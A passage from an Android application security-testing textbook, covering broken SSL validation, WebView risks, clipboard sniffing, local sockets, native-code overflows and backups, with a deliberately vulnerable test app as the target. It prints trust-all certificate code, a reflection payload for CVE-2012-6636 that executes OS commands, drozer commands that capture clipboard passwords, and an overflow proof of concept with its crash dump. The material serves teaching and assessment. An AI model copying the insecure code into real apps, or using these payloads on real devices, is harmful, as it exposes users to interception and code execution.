is to ensure that the information provided by the server matches conditions deemed\nacceptable to establish a trusted connection. The following code completely nullifies this check:\nTrustManager[] trustAllCerts = new TrustManager[] {\nnew X509TrustManager()\n{\npublic java.security.cert.X509Certificate[] getAcceptedIssuers()\n{\nreturn new java.security.cert.X509Certificate[] {};\n}\npublic void checkClientTrusted(X509Certificate[] chain,\nString authType) throws CertificateException\n{\n}\npublic void checkServerTrusted(X509Certificate[] chain,\nString authType) throws CertificateException\n{\n}\n}};\ncontext.init(null, trustAllCerts, new SecureRandom());\nAll of these solutions have come from development forums and gotten responses like “I could KISS you...except\nI won’t. You’ve saved me with this code!” and “Thank you, thank you, thank you.”\nThe problem with solutions of this nature is that an attacker who is positioned to intercept traffic from an\napplication could simply replace the certificate with his own, and the application will accept it. The attacker can\nthen read the contents of the traffic through his malicious proxy as if it were cleartext. Reading the portion of\ncode of your target application that handles connections to web servers will provide insight into whether they\nare performing verification of the certificate or allowing any certificate as shown in the earlier code. You could\nalso simply attempt to proxy the application blindly and observe what happens.\nSieve uses an HTTPS connection to allow the user to back up its database to an Internet server or retrieve it.\nThis in itself is not good security practice, as the contents of the database are not encrypted in any way.\nHowever, upon closer inspection of the SSL code, you can see that the developer has completely nullified the\nSSL validity checks as well. This was done by using an X509TrustManager that performs no checks at all. The\nfollowing snippet shows the offending code from the getNewHttpConnection method in the NetBackupHandler\nclass:\nX509TrustManager local1 = new X509TrustManager()\n{\npublic void checkClientTrusted(X509Certificate[]\nparamAnonymousArrayOfX509Certificate,\nString paramAnonymousString)\nthrows CertificateException { }\npublic void checkServerTrusted(X509Certificate[]\nparamAnonymousArrayOfX509Certificate,\nString paramAnonymousString)\nthrows CertificateException { }\npublic X509Certificate[] getAcceptedIssuers()\n{\nreturn null;\n}\n};\nWhen you use the functionality that invokes this code and requests are made through the Burp proxy, you can\nsee the HTTPS requests. The traffic displays in Burp even when the Burp CA is not installed on the device. This\nmeans that any network attacker that is able to intercept these requests to the server will be able to retrieve the\ncontents of the user’s password database. Chapter 8 presents practical attacks against poor SSL validation that\ncan be performed from a network.\nWebViews\nA WebView is an embeddable application element that allows web pages to be rendered within an application. It\nmakes use of web rendering engines for the loading of web pages and provides browser-like functionality. Prior\nto Android 4.4 it made use of the WebKit (see https://www.webkit.org/) rendering engine; however, it has\nsince been changed to use Chromium (see http://www.chromium.org).\nThe most important difference between handling pages in a web browser or in a WebView is that a WebView still\nruns within the context of the application that it is embedded in. Furthermore, a WebView provides a whole host\nof hooks that allow the parent application to change its behavior at runtime and catch certain events when\nloading pages. You must consider many security aspects when assessing a WebView. The most important aspect\nto look at is where a WebView is able to load its content from. Loading cleartext content is the single biggest\nmistake that can be made when implementing a WebView, because this opens it up to various forms of abuse\nfrom Man-in-the-Middle (MitM) attacks such as ARP poisoning.\nSimilarly to native code, ignoring SSL errors when loading content is possible. A callback can be overridden in\nthe WebViewClient class that handles SSL errors and is named onReceivedSslError. This callback by default\ncancels the loading of the page if the SSL certificate failed one of the checks performed on it and was found to be\ninvalid. Developers may not be able to meet these conditions during development and may choose to override\nthe check instead. This could look as follows:\n@Override\npublic void onReceivedSslError(WebView view, SslErrorHandler handler,\nSslError error)\n{\nhandler.proceed();\n}\nThis code tells the WebViewClient to proceed whenever an SSL error occurs, which completely defeats the point\nof having SSL in the first place. This means that the possibility exists to perform a MitM attack against this\napplication—present a different certificate to it and it would be accepted, effectively allowing the attacker to read\nor completely change the content being displayed to the user.\nWhat the attacker’s code would be able to do depends on the configuration of the WebView. To obtain the\nconfiguration for each WebView invoke the following:\nWebSettings settings = webView.getWebSettings();\nYou can also use the WebSettings class to change the configuration of the WebView. Table 7.2 shows the available\nsettings to change.\nTable 7.2 Configuration options available in the WebSettings class that pertain to security\nMETHOD DEFAULT IMPLICATION OF BEING ENABLED\nVALUE\nsetAllowContent Access true WebView has access to content providers on the\nsystem.\nsetAllowFileAccess true Allows a WebView to load content from the filesystem\nusing file:// scheme.\nsetAllowFileAccessFromFileURLs true (<= API Allows the HTML file that was loaded using file://\n15) false (>= scheme to access other files on the filesystem.\nAPI 16)\nAllows the HTML file that was loaded using file:// to\nsetAllowUniversalAccessFromFileURLs true (<= API\naccess content from any origin (including other files).\n15)false (>=\nAPI 16)\nsetJavaScriptEnabled false Allows the WebView to execute JavaScript.\nsetPluginState (deprecated in API PluginState.OFF Allows the loading of plug-ins (for example, Flash)\n18) inside the WebView. This could in some cases even be\nused to load a malicious plug-in (see Google Bug\n#13678484 aka “Fake ID Vulnerability”).\nsetSavePassword (deprecated in API true The WebView will save passwords entered.\n18)\nThe most accessible way for an attacker to exploit a WebView is if it is loading cleartext content from the Internet,\nbecause an attacker could make use of traffic interception techniques to modify the responses back from the\nserver. An attacker could at this point include arbitrary code that renders inside the WebView and has the same\nlevel of access as the original content. This means that what an attacker would be able to do is heavily\ndependent on the configuration of the particular WebView.\nOther applications on the same device could also exploit a WebView if an application component exposes it in\nsome way. For instance, if receiving an intent on an exported component causes the instantiation of a WebView\nthat opens a URL that was provided as an extra in the intent sent by the other application, then a valid code path\nexists to attack the WebView. An excellent example of such a scenario is provided at\nhttps://www.securecoding.cert.org/confluence/display/java/. Here is a slightly modified version of this\nexample:\npublic class MyBrowser extends Activity\n{\n@override\npublic void onCreate(Bundle savedInstanceState)\n{\nsuper.onCreate(savedInstanceState);\nsetContentView(R.layout.main);\nWebView webView = (WebView) findViewById(R.id.webview);\nWebSettings settings = webView.getSettings();\nsettings.setJavaScriptEnabled(true);\nsettings.setAllowUniversalAccessFromFileURLs(true);\nString turl = getIntent().getStringExtra(\"URL\");\nwebView.loadUrl(turl);\n}\n}\nA malicious application could send an intent with an extra containing a URI such as\nfile:///data/data/com.malicious.app/exploit.html. For this URI to load, the malicious application would\nhave to make the exploit.html file in its private data directory world readable. This technique would work\nbecause a WebView by default allows the loading of local files. In conjunction with the\nsetAllowUniversalAccessFromFileURLs option set to true in the code, this scenario allows an attacker to load\nmalicious code inside this WebView and use it to steal files and transmit them to an Internet server.\nA feature of the WebView class that came under heavy scrutiny in 2013 was the ability to add JavaScript interfaces\nto a WebView. These interfaces allow the bridging of JavaScript that is loaded inside a WebView to actual Java code\nin the application. This allows for a much more feature-rich experience because normal JavaScript loaded from\na website then has the ability to invoke any code specified inside the application. Depending on the permissions\nof the application containing the WebView, this could literally be any code the developer wanted; for example,\ncode that reads all SMS messages or performs recordings from the microphone. This is why looking for such\nfeatures when assessing an application that implements a WebView is important. Adding a so-called “bridge”\nbetween JavaScript and Java code can be done using the addJavascriptInterface method on the WebView. Here\nis a simple example of implementing a JavaScriptInterface:\n/* Java code */\nclass JavaScriptObj\n{\n@JavascriptInterface\npublic String hello()\n{\nreturn \"I am from Java code\";\n}\n}\nwebView.addJavascriptInterface(new JavaScriptObj(), \"jsvar\");\nString content = \"<html><script>alert(jsvar.hello());</script></html>\";\nwebView.loadData(content, \"text/html\", null);\nThe preceding code loads a page that pops up an alert containing the response from the hello() method, thereby\nadding a bridge from native Java code into a JavaScript variable named jsvar.\nNow consider the scenario where an application allowed the retrieval of SMS messages or the initiation of\nphone calls from the bridge. If an attacker could find a way to inject his own code into the WebView, he would be\nable to invoke this functionality and abuse these bridged functions for evil purposes. You would have to\ndetermine the impact of exploiting a bridge after reading the relevant code of your target application.\nWhen assessing an application, finding any code that makes use of a WebView is important, especially when it\nmakes use of a JavaScript bridge. Finding this functionality is as simple as searching for keywords such as\nWebView or addJavaScriptInterface inside the application.\nCVE-2012-6636—ADDJAVASCRIPTINTERFACE ARBITRARY CODE EXECUTION\nWhen a JavascriptInterface is used to bind a JavaScript variable to a class, not only code from the\nexposed class can be executed. Using reflection techniques, public methods from any class could be\nexecuted. If the name of the interface variable is jsvar, then the following code would allow the execution\nof any operating system command:\nwindow.jsvar.getClass().forName('java.lang.Runtime').getMethod(\n'getRuntime',null).invoke(null,null).exec(cmd);\nThis code essentially performs a Runtime.getRuntime().exec(). The cmd in this case would have to be of\nthe format ['/system/bin/sh','-c','os_ command'] and allows os_command to be any command or chain\nof commands being piped together or redirected. Chapter 8 presents more in-depth exploration of the\nexploitation of this vulnerability.\nThis issue is present on all API versions prior to 17 (which equates to Android 4.1). This also means that\nany application that has been compiled with an android:targetSdkVersion attribute in the <uses-sdk>\nelement of less than 17 will also be vulnerable, regardless of the device it is running on.\nAPI versions 17 and higher have a fix implemented. Any method that the developer wants to be exposed to\nthe bridge should be explicitly marked with the @JavascriptInterface annotation. The minimalistic\nexample shown earlier that had a method named hello() had this annotation present. Without this\nannotation present, later versions of Android would not allow the hello() method to be accessed from\nJavaScript.\nWhen testing an application for this vulnerability, you can do a manual inspection to look for the cases\npreviously discussed. You can also install a drozer module for this purpose:\ndz> module install javascript\nProcessing jubax.javascript... Done.\nSuccessfully installed 1 modules, 0 already installed.\nThis installs a new module under scanner.misc.checkjavascriptbridge. You can use it to perform some\nbasic checks on the DEX file for keywords that indicate a JavaScriptInterface is in use and, according to\nhow the application has been configured, whether it would be exploitable or not.\ndz> run scanner.misc.checkjavascriptbridge -a com.vulnerable.js\nPackage: com.vulnerable.js\n- vulnerable to WebView.addJavascriptInterface + targetSdkVersion=15\n- not vulnerable to org.chromium.content.browser.addPossiblyUnsafeJava\nscriptInterface\nNeil Bergman disclosed this issue publicly at http://50.56.33.56/blog/?p=314 in December 2012.\nHowever, the exploitation of this issue only became common knowledge late in 2013, when David Hartley\nfrom MWR InfoSecurity issued an advisory at\nhttps://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-\ncode-execution/ on abusing applications that make use of a JavaScriptInterface for loading\nadvertisements.\nOther Communication Mechanisms\nApplications could implement a plethora of techniques for communicating with other applications on the same\ndevice or Internet servers. In general, you must assess the implementation of these techniques on a case-by-\ncase basis. This section provides some information about communication mechanisms that the author has\ndiscovered while assessing applications.\nClipboard\nThe Android clipboard works in a similar way to clipboards on a desktop operating system. A global clipboard is\nused by all applications on a device and this value can be read and altered by any application. In contradiction to\nsome other aspects of Android, no permission is required to read or write to the clipboard.\nAs such, any data that is placed on the clipboard can be read by any application. The ClipboardManager class\nhandles reads and writes to the clipboard (see\nhttp://developer.android.com/reference/android/content/ClipboardManager.html). Beginning with Android\n3.0 a method was added to the ClipboardManager that allows callback events to be registered when the “primary\nclip” is changed.\nIt goes without saying that an attacker who has a malicious application installed on a device could register a\ncallback and read anything that is on the clipboard. This makes it completely insecure as a means of\ncommunicating between applications because the data on the clipboard can be considered publicly accessible by\nall applications.\nA malicious application that is reading from the clipboard may find it especially fruitful when the user of the\ndevice is making use of a password manager. This is because whenever the user copies a password into the\nclipboard it would cause an event on the malicious application that retrieves the value. The Sieve application\nallows its users to copy passwords to the clipboard by clicking on one of the stored user accounts in the list. One\nof drozer’s post-exploitation modules allows a user to read the clipboard. You install it by running module\ninstall clipboard. After clicking on a service in the list in Sieve and then running the newly installed module,\nyou see the user’s password:\ndz> run post.capture.clipboard\n[*] Clipboard value: password123\nSetting the clipboard content from any application is also possible, as demonstrated in drozer:\ndz> run post.perform.setclipboard mahh123\n[*] Clipboard value set: mahh123\ndz> run post.capture.clipboard\n[*] Clipboard value: mahh123\nWhen assessing an application that makes use of the clipboard for any reason, consider the attacks previously\ndiscussed to see whether the potential for abuse exists. It would be especially interesting if an application is\nreading values from the clipboard that is used inside the code. Tracing this path in the source code may lead to\nthe discovery of other vulnerabilities that are exposed because of this entry point of untrusted user input.\nLocal Sockets\nApplications may use sockets (whether they are TCP, UDP, or UNIX) to share information between applications\nor components of the same application. The problem with this approach is that it provides much less structure\nfor security than the APIs that the Android OS provides. For instance, look at an example where an application\nopens a TCP socket on port 5555 and binds it to 127.0.0.1. This looks as follows when you perform a netstat:\n$ adb shell netstat -antp\nProto Recv-Q Send-Q Local Address Foreign Address State\n...\ntcp 0 0 127.0.0.1:5555 0.0.0.0:* LISTEN\n...\nEven though other computers on the network cannot reach this port, applications on the same device can. This\nmethod in itself does not provide any form of authentication because any application can initiate a connection\nwith this listener.\nTCP/UDP Protocols with Other Hosts\nAn Android application can be designed to communicate with other hosts using a number of protocols. Proxying\nan application through a tool like Burp can only help uncover and test web traffic. Identifying which protocol is\nin use by an application can be tricky and you often must perform manual inspection of the code. Another way is\nto observe which host is being communicated with by using tcpdump on a rooted device or emulator. Starting\ntcpdump and then opening the target application creates a packet dump. You can then inspect the packet dump\nusing Wireshark (see http://www.wireshark.org/) to discover the protocol and host being communicated with.\nYou can obtain the compiled tcpdump binary from any Android emulator at /system/xbin/tcpdump or compile the\nsource from http://www.tcpdump.org/. Running tcpdump and writing the output to a file looks as follows:\nroot@generic:/ # tcpdump -w /data/local/tmp/dump.cap\ntcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 96\nbytes\n^C260 packets captured\n261 packets received by filter\n0 packets dropped by kernel\nHowever, when you pull this file from the emulator and open it in Wireshark, the error shown in Figure 7.13\nappears.\nFigure 7.13 An error in Wireshark when you try to open the generated capture file\nThis happened because all packets are truncated by default to 96 bytes by tcpdump because this keeps the output\nfile small. To see entire packets and their contents you would need to instruct tcpdump to use the maximum\navailable size, which is 65,535 bytes. To do so, add a -s 0 to the tcpdump command. Following is the command to\nensure a full packet capture:\nroot@generic:/ # tcpdump -s 0 -w /data/local/tmp/dump.cap\ntcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size\n65535 bytes\n^C14 packets captured\n15 packets received by filter\n0 packets dropped by kernel\nA nice trick to be able to see live packet captures on an Android device in real time is to use network redirection\ntechniques to pipe the output of tcpdump directly into Wireshark. To do this on an emulator, follow these steps:\n1. Start tcpdump and forward output to a listening port.\n$ adb shell \"tcpdump -s 0 -w - | nc -l -p 4444\"\n2. Forward the port using ADB.\n$ adb forward tcp:4444 tcp:4444\n3. Connect to the port and pipe the output to Wireshark.\n$ nc localhost 4444 | sudo wireshark -k -S -i -\nAfter you have identified the traffic being sent and received by your application, you will be in a better position\nto locate the relevant source. Indicators like the port in use by the communications, the IP address, or DNS\nname would all be good starting points for searching through the source code and finding the supporting code.\nAfter discovering the relevant classes that are making the connections, you can assess them. Some applications\nmay implement custom TCP protocols that you would need to manipulate. You can use tools like Canape (see\nhttp://www.contextis.com/services/research/canape/) and Mallory (see\nhttps://intrepidusgroup.com/insight/mallory/) to intercept and modify TCP or UDP traffic for custom\nprotocols. This does not mean that these tools are automatic; and they are often tricky to get running correctly.\nYou still need a solid understanding of the code in order to build a proper testing environment using these tools.\nA technique you can use on a device or emulator to trick it to connecting to a transparent proxy provided by\nthese tools is to add a DNS entry that is used by the application. If an application is connecting to a TCP port on\nan Internet-facing server and it is using DNS to resolve the IP address, then you may be in luck. By editing the\nHOSTS file found at /system/etc/hosts, you can trick the application into connecting to your transparent proxy\nby setting the DNS name that is queried by the application to your computer’s IP address.\nExploiting Other Vectors\nThis section presents the exploitation of native C/C++ code within Android applications as well as package\nmisconfigurations that can lead to the compromise of an application.\nAbusing Native Code\nAndroid applications can include native code that is written in C/C++ and make use of the Java Native Interface\n(JNI) to interact with these libraries from Java. It is no secret that native code can contain many problems and\nis difficult to secure. This means that any input into native code on Android introduces the potential for an\nattacker to exploit a vulnerability and take control of the process to execute arbitrary code.\nFinding Native Code\nNative code could be used at any point in an application and so you would have to discover calls to native\nfunctions inside the application code. Strings that you can search inside decompiled code that would indicate the\ndeclaration or use of a native library are System.loadLibrary, System.load or the native keyword. The library\nbeing specified by System.loadLibrary needs to be included inside the APK under the /lib folder. A library\nloaded by System.load can be anywhere on the filesystem, as long as it is accessible and executable by the\napplication.\nTo find out what a native library is doing without having the application’s source code, you would have to\nreverse engineer the library using a tool like IDA (see https://www.hex-rays.com/products/ida/). You should\naudit these libraries for common vulnerabilities found in C/C++ applications. Multiple publications and many\nother resources are available on finding vulnerabilities that allow for the execution of arbitrary code. Therefore,\nthis chapter does not delve into any of these issues. Applications could also contain third-party libraries, such as\nOpenSSL. During the timespan available in a normal assessment of an application, trying to find new\nvulnerabilities in a large third-party library would likely not be feasible. Instead, find the version of the library in\nuse by searching for indicators in IDA, or using another known way to find it that is unique to the library.\nFinding the version in use and searching on the Internet could lead to the discovery of already-disclosed\nvulnerabilities for that version. Vulnerabilities in these components could perhaps be used as an attack path\ninto the application.\nThe Sieve application contains two custom libraries that are used for the encryption and decryption of\npasswords stored in the password manager. The names of these libraries are libencrypt.so and libdecrypt.so. You\ncan see these libraries being loaded inside CryptoService.java and their available functions defined:\nstatic\n{\nSystem.loadLibrary(\"encrypt\");\nSystem.loadLibrary(\"decrypt\");\n}\n...\nprivate native String runNDKdecrypt(String paramString,\nbyte[] paramArrayOfByte);\nprivate native byte[] runNDKencrypt(String paramString1,\nString paramString2);\nTracing these functions back to where they are used inside the Sieve application reveals a path into this code\nthat accepts user input. Particularly, it is used by the exposed CryptoService service. This means that\nparameters that can be passed directly into this code have the potential to exploit vulnerabilities in the native\ncode.\nThe only aspect missing to make this a complete attack vector is a vulnerability in one of these native functions.\nLet us examine libencrypt.so and attempt to find exploitable vulnerabilities. Figure 7.14 shows loading this file\ninto IDA (even the free version supports ARM).\nFigure 7.14 Loading libencrypt.so into IDA\nLooking for the runNDKencrypt function reveals that it has been named\nJava_com_mwr_example_sieve_CryptoService_runNDKencrypt in IDA. Click this function and press the spacebar\nkey to put IDA into graph mode, which may be easier for visualizing the flow of the code. Careful inspection\nreveals a vulnerable memcpy implementation in the code. Finding the exact disassembly that shows this\nvulnerability will be left as an exercise for you. Instead we translate this back to C++ code and examine it\nfurther from there:\nconst char* key_userinput = (*env)->GetStringUTFChars(env, jkey, 0);\nint key_len = strlen(key_userinput);\nuint32_t key[4];\nmemcpy(key, key_userinput, sizeof(char) * key_len);\nThe vulnerability in the previous code is that user input is used inside the memcpy operation, and the length of\nthe user input is used to determine how many bytes to copy into the key variable. If the user provides a key\nlength of anything more than 4, a buffer overflow occurs. The vulnerable code can be reached by interacting\nwith the exported CryptoService examined earlier in this chapter. You can see a proof of concept that triggers\nthis vulnerability by sending an overly long com.mwr.example.sieve.KEY extra to the CryptoService:\ndz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve\n.CryptoService --msg 3452 2 3 --extra string com.mwr.example.sieve.KEY\nzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\nzzzzzzzzzzzzzzzzzzzzzAAAAzzzz\n--extra string com.mwr.example.sieve.STRING \"string to be encrypted\"\n--bundle-as-obj\nDid not receive a reply from\ncom.mwr.example.sieve/com.mwr.example.sieve.CryptoService.\nViewing what happens in logcat reveals the following:\nF/libc ( 5196): Fatal signal 11 (SIGSEGV) at 0x41414141 (code=1),\nthread 5209 (m_CryptoService)\nI/DEBUG ( 49): *** *** *** *** *** *** *** *** *** *** *** *** ***\nI/DEBUG ( 49): Build fingerprint: 'generic/sdk/generic:4.4.2/KK/9380\n07:eng/test-keys'\nI/DEBUG ( 49): Revision: '0'\nI/DEBUG ( 49): pid: 5196, tid: 5209, name: m_CryptoService >>>\ncom.mwr.example.sieve:remote <<<\nI/DEBUG ( 49): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr\n41414141\nI/DEBUG ( 49): r0 b807bb68 r1 a8db7a0e r2 ffffffee r3\n41414141\nI/DEBUG ( 49): r4 b5b09e01 r5 00000004 r6 00000000 r7\na8db7a30\nI/DEBUG ( 49): r8 a8db7a28 r9 abb9ded0 sl b807b158 fp\na8db7adc\nI/DEBUG ( 49): ip 80000000 sp a8db79e0 lr a8e41f07 pc\na8e41f08 cpsr 60000030\nI/DEBUG ( 49): d0 3f80000040000000 d1 3f50624d40000000\nI/DEBUG ( 49): d2 7e37e43c8800759c d3 7e37e43c8800759c\nI/DEBUG ( 49): d4 8000000000000000 d5 3f40000042810000\nI/DEBUG ( 49): d6 3fc999999999999a d7 3f80000000000000\nI/DEBUG ( 49): d8 0000000000000000 d9 0000000000000000\nI/DEBUG ( 49): d10 0000000000000000 d11 0000000000000000\nI/DEBUG ( 49): d12 0000000000000000 d13 0000000000000000\nI/DEBUG ( 49): d14 0000000000000000 d15 0000000000000000\nI/DEBUG ( 49): scr 60000010\nI/DEBUG ( 49):\nI/DEBUG ( 49): backtrace:\nI/DEBUG ( 49): #00 pc 00000f08 /data/app-lib/com.mwr.example\n.sieve-1/libencrypt.so (Java_com_mwr_example_sieve_CryptoService_\nrunNDKencrypt+531)\n...\nI/DEBUG ( 49): a8db7a0c d8dc5d7b\nI/DEBUG ( 49): a8db7a10 b5b09e01 /system/lib/libdvm.so\nI/DEBUG ( 49): a8db7a14 b807b148 [heap]\nI/DEBUG ( 49): a8db7a18 7a7a7a7a\nI/DEBUG ( 49): a8db7a1c 7a7a7a7a\nI/DEBUG ( 49): ........ ........\nI/DEBUG ( 49): #01 a8db7ac8 abb9decc\nI/DEBUG ( 49): a8db7acc 00000001\n...\nI/DEBUG ( 49): memory near r0:\nI/DEBUG ( 49): b807bb48 00000000 00000000 00000000 00000000\nI/DEBUG ( 49): b807bb58 00000000 00000000 00000000 0000003b\nI/DEBUG ( 49): b807bb68 a0c58026 3dd0d7d5 a8c9c62c 1c7c59bb\nI/DEBUG ( 49): b807bb78 c7920389 0021b22f fbb2801a 4884621f\nI/DEBUG ( 49): b807bb88 c54c3f0a 6c005d7b 00000065 00000000\nI/DEBUG ( 49): b807bb98 00000038 0000003b 00000000 00000000\nI/DEBUG ( 49): b807bba8 00000000 00000000 00000000 00000000\nI/DEBUG ( 49): b807bbb8 00000000 00000000 00000000 00010001\nI/DEBUG ( 49): b807bbc8 00000000 0000001a 646e614c 00000073\nI/DEBUG ( 49): b807bbd8 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a\nI/DEBUG ( 49): b807bbe8 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a\nI/DEBUG ( 49): b807bbf8 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a\nI/DEBUG ( 49): b807bc08 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a\nI/DEBUG ( 49): b807bc18 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a\nI/DEBUG ( 49): b807bc28 7a7a7a7a 7a7a7a7a 7a7a7a7a 41414141\nI/DEBUG ( 49): b807bc38 7a7a7a7a 00650000 0073002f 00000023\n...\nI/DEBUG ( 49): memory near sp:\nI/DEBUG ( 49): a8db79c0 a8db7a30 a8db7a28 abb9ded0 b807b158\nI/DEBUG ( 49): a8db79d0 a8db7adc b807bb68 b5b09e01 a8e41f07\nI/DEBUG ( 49): a8db79e0 a8db7adc b5b09e7d a0c58026 3dd0d7d5\nI/DEBUG ( 49): a8db79f0 a8c9c62c 1c7c59bb c7920389 0021b22f\nI/DEBUG ( 49): a8db7a00 fbb2801a 4884621f c54c3f0a d8dc5d7b\nI/DEBUG ( 49): a8db7a10 b5b09e01 b807b148 7a7a7a7a 7a7a7a7a\nI/DEBUG ( 49): a8db7a20 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a\nI/DEBUG ( 49): a8db7a30 7a7a7a7a 00000000 0000000a 00000000\nI/DEBUG ( 49): a8db7a40 7a7a7a7a 00000000 0000000a 00000000\nI/DEBUG ( 49): a8db7a50 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a\nI/DEBUG ( 49): a8db7a60 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a\nI/DEBUG ( 49): a8db7a70 7a7a7a7a 41414141 00000026 0000000a\nI/DEBUG ( 49): a8db7a80 b807bbd8 00000064 b807bc48 00000016\nI/DEBUG ( 49): a8db7a90 00000003 a8db7a18 00000009 a8db79e8\nI/DEBUG ( 49): a8db7aa0 b807bb68 00000000 c54c3f0a d8dc5d7b\nI/DEBUG ( 49): a8db7ab0 a8db7ac8 af6357d0 b807b148 00000004\nI/DEBUG ( 49):\n...\nI/DEBUG ( 49):\nI/DEBUG ( 49): memory map around fault addr 41414141:\nI/DEBUG ( 49): (no map below)\nI/DEBUG ( 49): (no map for address)\nI/DEBUG ( 49): a8b41000-a8cb8000 r-x /dev/ashmem/dalvik-jit-code\n-cache (deleted)\nThe sequence AAAA translates to 41414141 in hex. This is used inside the supplied extra at a strategic position\nand results in the CPU attempting to jump to this location, thus causing an error condition which the system\nreports. This is a user-supplied address that comes directly from what we sent to this service from another\napplication. This basic buffer overflow vulnerability shows how the triggering of such a condition can be viewed\nin logcat.\nAttaching a Debugger\nTo start the exploitation process, attaching a debugger to the application at the time of the crash is essential.\nAndroid contains a Just-In-Time debugging feature that you can use for this purpose. To configure this feature,\nfind the UID of the target application. Do this in drozer by observing the output of the app .package.info\nmodule:\ndz> run app.package.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\nApplication Label: Sieve\nProcess Name: com.mwr.example.sieve\nVersion: 1.0\nData Directory: /data/data/com.mwr.example.sieve\nAPK Path: /data/app/com.mwr.example.sieve-1.apk\nUID: 10053\nGID: [1028, 1015, 3003]\nShared Libraries: null\nShared User ID: null\nUses Permissions:\n- android.permission.READ_EXTERNAL_STORAGE\n- android.permission.WRITE_EXTERNAL_STORAGE\n- android.permission.INTERNET\nDefines Permissions:\n- com.mwr.example.sieve.READ_KEYS\n- com.mwr.example.sieve.WRITE_KEYS\nYou can now issue a command via an ADB shell that sets a property that causes a JIT debugger to attach to a\ncrashed process with UID <= 10053 (from the discovered application UID):\n$ adb shell setprop debug.db.uid 10053\nCausing the crash in Sieve again reveals the following in logcat:\n...\nI/DEBUG ( 49): ********************************************************\nI/DEBUG ( 49): * Process 5345 has been suspended while crashing. To\nI/DEBUG ( 49): * attach gdbserver for a gdb connection on port 5039\nI/DEBUG ( 49): * and start gdbclient:\nI/DEBUG ( 49): *\nI/DEBUG ( 49): * gdbclient app_process :5039 5345\nI/DEBUG ( 49): *\nI/DEBUG ( 49): * Wait for gdb to start, then press HOME or VOLUME DOWN key\nI/DEBUG ( 49): * to let the process continue crashing.\nI/DEBUG ( 49): ********************************************************\nThis shows that the process has been suspended and is available for debugging. You can attach a gdbserver to\nthis process as follows:\n$ adb shell gdbserver :5039 --attach 5345\nAttached; pid = 5345\nListening on port 5039\nIt is now listening on port TCP/5039 for a debugging client to connect to it. This listening port should be\nforwarded:\n$ adb forward tcp:5039 tcp:5039\nYou can find a special architecture-specific GDB client in the Android NDK (see\nhttps://developer.android.com/tools/sdk/ndk/index.html) and use it to attach to the gdbserver that is\nholding the crashed process. In this example, we used a normal ARM-based emulator and so we make use of the\n“armeabi” GDB client:\n$ cd /path/to/android-ndk-r9d/toolchains/\n$ arm-linux-androideabi-4.8/prebuilt/linux-x86_64/bin/arm-linux-androideabi-gdb\nGNU gdb (GDB) 7.3.1-gg2\nCopyright (C) 2011 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"--host=x86_64-linux-gnu --target=arm-linux-android\".\nFor bug reporting instructions, please see:\n<http://source.android.com/source/report-bugs.html>.\n(gdb) target remote :5039\nRemote debugging using :5039\n0xb6f645cc in ?? ()\n(gdb)\nAfter it is successfully attached, the iterative process of crafting an exploit for this issue can begin. The\nexploitation of this issue is out of the scope of this chapter. A thorough understanding of the architecture on\nwhich you are writing the exploit (typically ARM on most Android devices) and knowledge of common\nexploitation techniques is required. Chapter 8 shows the end product of exploiting an application using native\ncode and the tools that you can use post-exploitation. Exploiting this issue on a modern version of Android\nusing exploit mitigations such as stack canaries, NX, and full ASLR presents a huge challenge to any attacker.\nOn older versions of Android, a skilled exploit writer can still create an exploit for this issue with relative ease.\nYou can use other debuggers in the exploitation process. A paid option could be the android_server and\ndebugging capabilities provided by IDA Pro. A free debugger that has the look and feel of OllyDbg (a popular\ndebugger for Windows) is also available at http://www.gikir.com/. However, many exploit developers prefer to\njust use GDB because it provides very powerful functionality. Beware—it is renowned for its intimidating\ncommand-line interface for beginners.\nExploiting Misconfigured Package Attributes\nMany attributes are available to set in the <application> tag found in the AndroidManifest.xml of an\napplication. All of these attributes may look harmless to the untrained eye. This section focuses on two\nattributes that have a significant impact on the security of an application.\nApplication Backups\nSince Android 4.0, backing up all applications, their data, and other shared data on the device (on an SD card for\nexample) on a non-rooted device is possible. The manifest attribute that controls whether a backup of the\napplication data is allowed or not is android:allowBackup. However, the default value of this attribute is true.\nThis is great from a usability point of view because application developers who are not even aware of this\nattribute can still allow people using their app to back up their application data. From a security perspective, this\nalso means that application developers who are not aware of this attribute will allow the exposure of their\napplication data if physical access to a device running their application is obtained. To find applications that\nallow backups to be made, use the app.package.backup drozer module. If a particular application is of interest\n(like Sieve), you can use the module in the following manner:\ndz> run app.package.backup -f com.mwr.example.sieve\nPackage: com.mwr.example.sieve\nUID: 10053\nBackup Agent: null\nAPI Key: Unknown\nThe output shows that the android:allowBackup attribute is set to true for the application and that the contents\nof its private data directory can be dumped using ADB. If the android:backupAgent attribute is set in the\nmanifest, it points to the class that extends BackupAgent and allows the developer to control this functionality to\na greater degree. If an application makes use of a custom backup agent, you would need to review the code of\nthe class stated in the manifest.\nTo back up an application, use the adb backup feature. To perform this action on Sieve you use the following\ncommand:\n$ adb backup com.mwr.example.sieve\nNow unlock your device and confirm the backup operation.\nAfter this, an activity launches and asks you to specify an encryption key. Leave the key field blank and tap Back\nUp My Data. Figure 7.15 shows the presented activity.\nFigure 7.15 The application backup activity\nA file named backup.ab will be placed in your current working directory on your computer. The file format is a\nTAR file that makes use of a DEFLATE algorithm for compression. This peculiar combination of algorithms has\nbeen the subject of many forum posts. Nikolay Elenkov posted a simple way to convert an AB file back to a 